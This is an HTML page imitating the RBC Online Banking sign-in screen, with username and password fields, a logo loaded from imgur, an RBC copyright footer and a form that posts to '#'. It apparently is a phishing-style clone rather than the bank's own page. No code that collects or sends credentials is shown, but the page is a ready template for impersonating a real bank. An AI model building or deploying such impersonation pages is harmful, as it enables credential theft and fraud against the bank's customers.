<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>RBC Login</title>
<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #e6f0fa;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  .login-container {
    background-color: #ffffff;
    padding: 40px;
    border-radius: 8px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
    max-width: 400px;
    width: 100%;
    box-sizing: border-box;
  }
  .logo {
    display: flex;
    justify-content: center;
    margin-bottom: 20px;
  }
  .forgot {
    margin-top: 10px;
    font-size: 13px;
    text-align: center;
  }
  h2 {
    text-align: center;
    color: #006aff;
    margin-bottom: 20px;
  }
  form {
    display: flex;
    flex-direction: column;
  }
  label {
    margin-bottom: 8px;
    font-weight: bold;
  }
  input[type="text"],
  input[type="password"] {
    padding: 10px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 4px;
    font-size: 14px;
  }
  button {
    background-color: #006aff;
    color: #fff;
    padding: 12px;
    border: none;
    border-radius: 4px;
    font-size: 15px;
    cursor: pointer;
    transition: background-color 0.3s;
  }
  button:hover {
    background-color: #0051d4;
  }
  .footer {
    margin-top: 20px;
    text-align: center;
    font-size: 12px;
    color: #555;
  }
</style>
</head>
<body>
<div class="login-container">
  <div class="logo">
    <!-- New Imgur Logo -->
    <a href="https://imgur.com/Ai6ef5T">
      <img src="https://i.imgur.com/Ai6ef5T.png" 
           alt="New Logo" 
           style="max-width: 220px; height: auto;" />
    </a>
  </div>
  
  <h2>Sign in to RBC Online Banking</h2>
  <form action="#" method="POST">
    <label for="username">Username or Client ID</label>
    <input type="text" id="username" name="username" placeholder="Enter your username" required />
    <label for="password">Password</label>
    <input type="password" id="password" name="password" placeholder="Enter your password" required />
    <button type="submit">Sign In</button>
    <div class="forgot">
      <a href="#">Forgot username or password?</a>
    </div>
  </form>
  <div class="footer">
    &copy; 2024 RBC. All rights reserved.
  </div>
</div>
</body>
</html>
